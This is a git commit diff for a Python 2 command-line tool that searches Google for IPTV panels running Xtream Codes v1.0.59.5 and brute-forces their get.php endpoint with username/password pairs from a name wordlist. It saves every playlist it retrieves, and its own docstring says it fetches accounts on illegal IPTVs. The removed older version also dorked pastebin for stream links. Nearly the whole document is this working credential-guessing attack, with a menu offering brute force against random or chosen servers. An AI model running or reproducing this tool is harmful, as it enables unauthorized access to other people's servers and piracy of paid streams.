bb1964216ab0df01d14fdb05916bf423de807ef8
Ludo237 <ludovico1990@hotmail.it>
2016-01-07 12:04:00 +0100

    Restore current master

---
+++ iptv/Crawler.py
@@ -0,0 +1,131 @@
+import urllib2
+import google
+import time
+import pyprind
+import os
+import random
+from urlparse import urlparse
+
+"""Crawler
+Class that handles the crawling process that fetch accounts on illegal IPTVs
+
+Authors:
+Claudio Ludovico (@Ludo237)
+Pinperepette (@Pinperepette)
+"""
+class Crawler(object):
+    # output default directory
+    outputDir = "output"
+    # language default directory
+    languageDir = "name"
+    # string used to exploit the CMS
+    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
+    # string used to search the CMS
+    searchString = "Xtream Codes v1.0.59.5"
+
+    def __init__(self, language = "it"):
+        """Default constructor
+
+        Keyword arguments:
+        language -- Language parameter allows us to understand what kind of
+                    names file we need to use. (default it)
+        """
+        self.language = language.lower()
+        self.parsedUrls = []
+        self.foundedAccounts = 0
+
+    def change_language(self, language = "it"):
+        """Set the language you want to use to brute force names
+
+        Keyword arguments:
+        language -- Language parameter allows us to understand what kind of
+                    names file we need to use. (default it)
+
+        Return:
+        boolean -- true if the language file exists, otherwise false
+        """
+        if os.path.isfile("names/" + language + ".txt"):
+            self.language = language
+            return True
+        else:
+            return False
+
+
+    def search_links(self):
+        """Print the first 30 links from a Web search
+
+        We set the limit of 30 links because this script serve as demonstration and it's
+        not intended to be use for personal purpose.
+        """
+        for url in google.search(self.searchString, num=30, stop=1):
+            parsed = urlparse(url)
+            self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)
+
+    def search_accounts(self, url = None):
+        """Search Accounts
+        This is the core method. It will crawl the give url for any possible accounts
+        If we found any we will create a new directory under /output with the name
+        of the site plus every account as five .m3u. Please use VLC for opening that
+        kind of files
+
+        Keyword arguments:
+        url -- an url from the fetched list. (default None)
+
+        Return:
+        string -- the status of the crawling session
+        """
+        if not self.parsedUrls:
+            return "You must fetch some URLs first"
+        try:
+            if not url:
+                url = random.choice(self.parsedUrls)
+            fileName = self.languageDir + self.language + ".txt"
+            foundedAccounts = 0
+            with open(fileName) as f:
+                rows = f.readlines()
+            for row in rows:
+                # Do the injection to the current url using the exploit that we know
+                request = urllib2.Request(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
+                response = urllib2.urlopen(request)
+                fetched = response.read()
+                # IF the fetched content is not empty
+                # we build the dedicated .m3u file
+                if len(fetched) > 0:
+                    newPath = self.outputDir + "/" + url.replace("http://", "")
+                    self.create_file(row, newPath, fetched)
+            # Remove the current used url in order to avoid to parse it again
+            self.parsedUrls.remove(url)
+        except IOError:
+            return "Cannot open the current Language file. Try another one"
+        except urllib2.HTTPError, e:
+            return "Ops, HTTPError exception here. Cannot fetch the current URL " + str(e.code)
+        except urllib2.URLError, e:
+            return "Ops, the URL seems broken." + str(e.reason)
+        except Exception:
+            return "Ops something went wrong!"
+        finally:
+            if self.foundedAccounts != 0:
+                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
+            else:
+                return "No results for " + url
+
+    def create_file(self, row, newPath, fetched):
+        """Create File
+        Once the parse founds something worth it, we need to create the .m3u file
+        to do so we except a newPath and the current row used from names file and also
+        the content from the fetched response
+
+        Keyword arguments:
+        row -- row of the language file, this allow us to understand which names
+        were useful for the brute force.
+
+        newPath -- The path that we use to store the current fetched accounts.
+
+        fetched -- the current response file from the attack.
+        """
+        if os.path.exists(newPath) is False:
+            os.makedirs(newPath)
+        outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
+        outputFile.write(fetched)
+        self.foundedAccounts = self.foundedAccounts + 1
+        outputFile.close()
--- iptv/iptv.py
+++ iptv/iptv.py
@@ -1,138 +1,61 @@
 #!/usr/bin/python
-# -*- coding: utf-8 -*-
+import Crawler
+import warnings
+from clint.textui import colored
 
-import urllib2, urllib, google, sys, os, time
-from urlparse import urlparse
-from sys import argv as s
-from tqdm import tqdm
-from termcolor import colored
+# Global Variables
+warnings.filterwarnings("ignore")
+cr = Crawler.Crawler("it")
 
-class IPTV(object):
-	def __init__(self, stdout=None, stderr=None):
-		self._stdout = stdout or sys.stdout
-		self._stderr = stderr or sys.stderr
-		self.lista = 'names.txt'
-		self.query = 'Xtream Codes v1.0.59.5'
-		self.directory = "output"
-		self.msg = "Pirate IPTV"
-		self.parsedUrls = ['']
-
-	def __enter__(self):
-		self.old_stdout, self.old_stderr = sys.stdout, sys.stderr
-		self.old_stdout.flush(); self.old_stderr.flush()
-		sys.stdout, sys.stderr = self._stdout, self._stderr
-
-	def __exit__(self, exc_type, exc_value, traceback):
-		self._stdout.flush(); self._stderr.flush()
-		sys.stdout = self.old_stdout
-		sys.stderr = self.old_stderr
-
-	def print_link(self):
-		with IPTV(stdout=devnull, stderr=devnull):
-			for url in google.search(self.query, num=60, stop=1):
-				parsed = urlparse(url)
-				self.parsedUrls.append(parsed.scheme + '://' + parsed.netloc +"\n")
-		time.sleep(1)
-		print '\n'.join(self.parsedUrls)
-
-	def search_pastebin(self):
-	       	dork = "site:pastebin.com m3u sky .ts"
-	       	info_giallo = colored ('[i]','yellow')
-	        print (info_giallo + " Dorking google...")
-	        url = google.search(dork, num=30, start=0, stop=None, pause=2.0)
-	        with IPTV(stdout=devnull, stderr=devnull):
-		        for x in url:
-		       		s = x.split("http://pastebin.com/")
-
-	        		if(len(s)>1):
-		        	    	if s[1].find("/") == -1:
-		        	        	#print "[i] Downloading pastie: " + s[1]
-	        		    		raw_url = "http://pastebin.com/raw/" + s[1]
-			
-			                	request = urllib2.urlopen(raw_url)
-		        	        	response = request.read()
-		
-				               	f = open("output_p/"+s[1]+".m3u", "w")
-			       	        	f.write(response)
-			        	    	f.close()
-
-	def search_account(self,URL, b=1, bsize=1):
-		segale_rosso = colored ('[*]','red')
-		segale_verde = colored ('[*]','green')
-		print (segale_rosso + ' [CTRL + c] = [IPTV Attack Interrupted]')
-		t= tqdm()
-		last_b = [0]
-		righe = open( self.lista ,'r')
-		tsize = len(righe.readlines())
-		TT = (str(tsize))
-		t.total = tsize
-		tr = 0
-		with open(self.lista) as f:
-			content = f.readlines()
-		for r in content:
-			req = urllib2.Request( URL + '/get.php?username=%s&password=%s&type=m3u&output=mpegts'%(r.rstrip().lstrip(),r.rstrip().lstrip()))
-			response = urllib2.urlopen(req)
-			the_page = response.read()
-			# numero tentativi mancanti
-			tsize = (tsize - 1)
-			t.update((b - last_b[0]) * bsize)
-			last_b[0] = b
-			TM = (str(tsize))
-			#print ('Mancano ' + TM + ' Tentativi su ' + TT)
-			time.sleep(0.2)
-			if len(the_page) > 0:
-				tr = (tr + 1)
-				msg = (segale_verde + " Account found: ")
-				print (msg + str(tr))
-				new_path = self.directory + "/" + URL.replace("http://", "")
-				if os.path.exists(new_path) is False:
-					os.makedirs(new_path)
-				out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
-				out_file.write(the_page)
-				out_file.close()
-
+"""Print menu
+Easy menu for CLI navigation
+"""
 def menu():
-    try:
-        print "-= IPTV =-"
-        print
-        uno = colored ('[1]','green')
-        print (uno + " Print server list")
-        due = colored ('[2]','green')
-        print (due + " Brute force server")
-        tre = colored ('[3]','green')
-        print (tre + " Pastebin crawl")
-        quattro = colored ('[4]','red')
-        print (quattro + " Quit")
-        print
-        selection = input("Select an option: ")
+    print ""
+    print colored.yellow("################")
+    print colored.yellow("##### IPTV #####")
+    print colored.yellow("##### v1.2 #####")
+    print colored.yellow("################")
+    print ""
+    print colored.blue("Menu")
+    print "0 - Exit"
+    print "1 - Search for some Servers"
+    print "2 - Look at the servers list"
+    print "3 - Select language, default is Italian"
+    print "4 - Brute force random server"
+    print "5 - Brute force specific server"
+    print ""
 
-        if(selection==1):
-            app.print_link()
-            menu()
-
-        elif(selection==2):
-            server = raw_input("Server url: ")
-            app.search_account(server)
-            menu()
-
-        elif(selection==3):
-            app.search_pastebin()
-            menu()
-
-        elif(selection==4):
-            sys.exit(0)
-
-        else:
-            print "[!] Invalid option"
-            menu()
-
-    except KeyboardInterrupt:
-        segale_giallo = colored ('[*]','yellow')
-        print ("\r" + segale_giallo + ' IPTV Attack Interrupted')
-        sys.exit(0)
-
-if __name__ == "__main__":
-    print "- Code by: @Pinperepette @Arm4x @Ludo237"
-    app = IPTV()
-    devnull = open(os.devnull, 'w')
+while True:
     menu()
+    choosenMenu = int(raw_input("Please select an option: "))
+    if choosenMenu == 0:
+        print colored.red("Bye bye")
+        break;
+    elif choosenMenu == 1:
+        print colored.green("Fetching URLs plase wait...")
+        cr.search_links()
+        print colored.green("Done, 30 URLs founded")
+    elif choosenMenu == 2:
+        print colored.green("Printing server list")
+        for index, server in enumerate(cr.parsedUrls):
+            print "[" + str(index) + "] - " + server
+    elif choosenMenu == 3:
+        language = str(raw_input("What language do you need? (it, en, es): "))
+        if cr.change_language(language):
+        	print colored.green("Language changed")
+		else:
+			print colored.red("Cannot change language to " + language)
+    elif choosenMenu == 4:
+        result =  cr.search_accounts()
+        print colored.green(result)
+    elif choosenMenu == 5:
+        index = int(raw_input("Please provide the number near the URLs founded: "))
+        try:
+            url = cr.parsedUrls[index]
+            result = cr.search_accounts(url)
+            print colored.green(result)
+        except IndexError as e:
+            print colored.red("No URL founded at index: " + str(index))
+    else:
+        print colored.red("Option not recognized")
